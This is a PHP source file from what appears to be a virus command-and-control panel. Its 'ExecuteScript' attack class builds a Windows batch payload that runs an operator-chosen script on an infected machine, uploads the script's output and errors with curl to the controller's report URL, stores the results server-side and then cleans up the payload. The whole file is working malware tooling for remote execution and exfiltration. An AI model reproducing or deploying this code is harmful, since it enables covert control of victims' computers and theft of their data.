<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class ExecuteScript extends AttackInterface {
    private string $data = "";
    private string $script = "";
    private string $error = "";

    public function __construct() {
    }

    public function setScript(string $script): void {
        $this->script = $script;
    }

    public function getScript(): string {
        return $this->script;
    }

    public function setData(string $data): void {
        $this->data = $data;
    }

    public function getData(): string {
        return $this->data;
    }

    public function setError(string $error): void {
        $this->error = $error;
    }

    public function getError(): string {
        return $this->error;
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        use Kelvinho\Virus\Attack\AttackInterface;
        if (isset($_FILES["dataFile"]) && isset($_FILES["errFile"])) {
            $data = file_get_contents($_FILES["dataFile"]["tmp_name"]);
            $error = file_get_contents($_FILES["errFile"]["tmp_name"]);

            $attack = AttackInterface::get("<?php echo $this->attack_id; ?>");
            $attack->setData($data);
            $attack->setError($error);
            $attack->setExecuted();
            $attack->saveState();
        }
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->data = $state["data"];
        $this->script = $state["script"];
        $this->error = $state["error"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["data"] = $this->data;
        $state["error"] = $this->error;
        $state["script"] = $this->script;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -X POST --form "dataFile=@%~pd0data" --form "errFile=@%~pd0err" <?php echo DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        chCp 65001
        echo _>%~pd0data
        echo _>%~pd0err
        <?php echo $this->script . "\n";
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will include the correct admin page for this particular attack type.
     */
    public function includeAdminPage(): void {
        include(__DIR__ . "/admin.php");
    }

    /**
     * This will include the correct controller page for this particular attack type.
     */
    public function includeController(): void {
        include(__DIR__ . "/controller.php");
    }
}
